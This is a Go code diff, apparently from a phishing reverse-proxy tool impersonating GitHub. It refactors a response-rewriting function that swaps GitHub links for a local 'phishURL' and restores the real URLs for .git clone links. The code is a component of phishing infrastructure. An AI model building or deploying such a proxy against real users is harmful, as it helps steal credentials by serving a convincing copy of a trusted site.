@@ -1,10 +1,16 @@
 package main
 
 import (
+	"fmt"
 	"io/ioutil"
 	"net/http"
 	"regexp"
 	"strings"
+)
+
+const (
+	upstreamURL = "https://github.com"
+	phishURL    = "http://localhost:8080"
 )
 
 func replaceURLInResp(body []byte, header http.Header) []byte {
@@ -18,13 +24,15 @@ func replaceURLInResp(body []byte, header http.Header) []byte {
 	}
 
 	bodyStr := string(body)
-	bodyStr = strings.Replace(bodyStr, "https://github.com", "http://localhost:8080", -1)
+	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)
 
-	re, err := regexp.Compile(`http://localhost:8080(.*)\.git`)
+	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
+	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)
+	re, err := regexp.Compile(phishGitURL)
 	if err != nil {
 		panic(err)
 	}
-	bodyStr = re.ReplaceAllString(bodyStr, `https://github.com$1.git`)
+	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)
 
 	return []byte(bodyStr)
 }
